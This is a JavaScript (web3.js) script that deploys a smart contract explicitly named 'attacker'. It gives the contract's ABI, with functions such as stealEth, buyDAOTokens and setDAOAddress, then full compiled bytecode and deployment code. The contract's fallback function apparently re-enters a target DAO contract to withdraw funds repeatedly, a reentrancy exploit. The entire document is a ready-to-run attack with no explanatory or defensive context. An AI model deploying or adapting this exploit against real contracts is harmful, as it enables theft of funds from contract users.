var attackerContract = web3.eth.contract([{"constant":true,"inputs":[],"name":"a","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_transferAddress","type":"address"}],"name":"setTransferAddress","outputs":[],"type":"function"},{"constant":false,"inputs":[{"name":"_payee","type":"address"}],"name":"payOut","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[],"name":"daoAddress","outputs":[{"name":"","type":"address"}],"type":"function"},{"constant":false,"inputs":[{"name":"_amount","type":"uint256"}],"name":"stealEth","outputs":[],"type":"function"},{"constant":false,"inputs":[{"name":"_amount","type":"uint256"}],"name":"buyDAOTokens","outputs":[],"type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"arr","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[],"name":"resetA","outputs":[],"type":"function"},{"constant":false,"inputs":[{"name":"_dao","type":"address"}],"name":"setDAOAddress","outputs":[],"type":"function"},{"constant":false,"inputs":[],"name":"fundMe","outputs":[],"type":"function"},{"constant":true,"inputs":[],"name":"transferAddress","outputs":[{"name":"","type":"address"}],"type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"name":"caller","type":"address"},{"indexed":false,"name":"amount","type":"uint256"}],"name":"DefaultFunc","type":"event"}]); 
 
var attacker = attackerContract.new({ from: web3.eth.accounts[0], data: '606060405260006003600050556108098061001a6000396000f3606060405236156100ab576000357c0100000000000000000000000000000000000000000000000000000000900480630dbe671f14610414578063185a5671146104375780631922ff391461044f5780632131c68c1461047d5780633e4b799f146104b65780635591083f146104ce57806371e5ee5f146104e6578063733b92f714610512578063965afa8914610521578063b6a324e014610539578063f444fdd814610548576100ab565b6104125b7f5d39e0394f54338d03795c7ad2b3c35cc85e8b0f907f43a4ca1b054b095bf3103334604051808373ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a15b6005600360005054101561040f5760026000508054806001018281815481835581811511610165578183600052602060002091820191016101649190610146565b808211156101605760008181506000905550600101610146565b5090565b5b5050509190906000526020600020900160005b60036000505490919091505550600034600202600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163103101561034257600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663bec3fa17600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166327e235e330604051827c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506020604051808303816000876161da5a03f1156100025750505060405180519060200150604051837c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506000604051808303816000876161da5a03f115610002575050505b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f3fef3a33034604051837c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506020604051808303816000876161da5a03f1156100025750505060405180519060200150506003600081815054809291906001019190505550610105565b5b565b005b6104216004805050610581565b6040518082815260200191505060405180910390f35b61044d600480803590602001909190505061058a565b005b61046560048080359060200190919050506105b9565b60405180821515815260200191505060405180910390f35b61048a6004805050610618565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6104cc600480803590602001909190505061063e565b005b6104e460048080359060200190919050506106f6565b005b6104fc600480803590602001909190505061077e565b6040518082815260200191505060405180910390f35b61051f60048050506107a3565b005b61053760048080359060200190919050506107b1565b005b61054660048050506107e0565b005b61055560048050506107e3565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60036000505481565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908302179055505b50565b60008173ffffffffffffffffffffffffffffffffffffffff1660003073ffffffffffffffffffffffffffffffffffffffff1631604051809050600060405180830381858888f19350505050156106125760019050610613565b5b919050565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f3fef3a33083604051837c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506020604051808303816000876161da5a03f1156100025750505060405180519060200150505b50565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0febe4c82604051827c010000000000000000000000000000000000000000000000000000000002815260040180905060006040518083038185886185025a03f11561000257505050505b50565b600260005081815481101561000257906000526020600020900160005b915090505481565b60006003600050819055505b565b80600060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908302179055505b50565b5b565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156', gas: 4700000  }, function (e, contract){    console.log(e, contract); if (typeof contract.address !== 'undefined') { console.log('Deployed Contract attacker mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);}})